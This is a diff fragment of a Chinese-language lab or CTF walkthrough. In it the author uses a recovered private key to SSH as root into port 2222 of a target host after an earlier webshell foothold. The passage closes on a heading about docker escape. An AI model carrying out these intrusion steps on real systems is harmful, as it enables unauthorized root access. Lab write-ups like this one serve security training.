@@ -566,3 +566,29 @@ Warning: Permanently added '172.16.12.149' (ED25519) to the list of known hosts.
 root@172.16.12.149's password: 
 ```
 居然要密码，那说明不是这个密钥，但是注意信息收集时我们扫到了一个22端口，一个2222端口，显然22端口应该是我们现在webshell所处的docker容器的ssh端口，于是我们试试2222
+```bash
+┌──(kali㉿JYlover)-[/tmp/a]
+└─$ ssh  -p 2222 -i /tmp/a/key_fixed root@172.16.12.149
+ _______                    _        __
+|       |.-----.---.-.----.|__|.----.|  |_
+|   -   ||  _  |  _  |   _||  ||  __||   _|
+|_______||   __|___._|__|  |__||____||____|
+        |__| W I R E L E S S   F R E E D O M
+-----------------------------------------------------
+OpenWrt 18.06.4, r7828-ef3b437d7c
+-----------------------------------------------------
+Authorized access only. All connections are logged.
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+OpenWrt:~#
+```
+登陆成功
+# docker逃逸
